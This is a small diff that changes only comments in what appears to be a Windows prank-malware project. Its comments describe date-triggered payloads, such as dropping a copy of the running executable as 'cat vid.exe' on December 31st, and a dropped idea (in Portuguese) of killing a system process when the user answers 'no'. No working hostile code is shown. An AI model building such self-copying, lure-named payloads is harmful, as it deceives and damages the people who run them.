@@ -5,7 +5,7 @@
 
 #include "dates.h"
 
-#include "../unicurse.h"
+#include "../unicurse.h" // needed for cursed payloads
 
 // ============================================================
 // Dec 31st: drop a copy of the running exe as "cat vid.exe"
@@ -174,7 +174,7 @@ static void ShowAura()
         MB_OK | // eu ia montar uma logica de que se o
                 // user inputasse "no" ele matava algum proc
                 // do sistema, mas a preguica fala mais alto
-                // tlgd ;)
+                // tlgd ;)                          (TODO?)
         MB_ICONWARNING
     );
 
